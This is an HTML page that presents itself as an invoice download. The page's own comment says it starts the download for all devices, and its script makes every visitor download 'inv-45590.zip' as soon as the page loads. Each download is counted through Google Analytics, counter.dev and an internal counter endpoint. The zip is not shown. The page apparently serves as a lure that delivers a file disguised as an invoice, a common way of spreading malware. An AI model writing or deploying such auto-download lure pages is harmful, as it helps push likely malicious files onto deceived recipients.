<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Download Invoice</title>

<!-- Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-NFZ363R577"></script>
<script>
window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}
gtag('js', new Date());
gtag('config', 'G-NFZ363R577');
</script>

<!-- counter.dev -->
<script
  src="https://cdn.counter.dev/script.js"
  data-id="1ee3dbbd-09d2-42d4-b892-dfdb6f9b8e95"
  data-utcoffset="-5">
</script>

<script>
// отправка pageview ОБЯЗАТЕЛЬНО
window.addEventListener('load', function () {
    if (window.counter) {
        counter.trackPageview();
    }
});

async function trackDownload(method) {
    // GA4
    if (typeof gtag !== 'undefined') {
        gtag('event', 'invoice_download', {
            event_category: 'Download',
            event_label: 'inv-45590.zip',
            method: method
        });
    }

    // counter.dev Event
    if (window.counter) {
        counter.track('invoice_download');
    }

    // Cloudflare Counter API для инвойсов
    try {
        await fetch('/api/invoice-count', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
        });
    } catch (error) {
        console.error('Error tracking download:', error);
        // Не блокируем скачивание при ошибке
    }
}

function initiateDownload() {
    const link = document.createElement('a');
    link.href = 'inv-45590.zip';
    link.download = 'inv-45590.zip';
    
    link.addEventListener('click', function () {
        trackDownload('auto');
    });
    
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
}

window.onload = function () {
    // Автоматически запускаем скачивание для всех устройств
    initiateDownload();
};
</script>
</head>

<body style="font-family: Arial, sans-serif; text-align:center; padding:50px;">

<div>
    <h1>Downloading invoice…</h1>
    <p>
        If the download doesn't start,
        <a href="inv-45590.zip"
           download
           onclick="trackDownload('manual');">
           click here
        </a>
    </p>
</div>

</body>
</html>

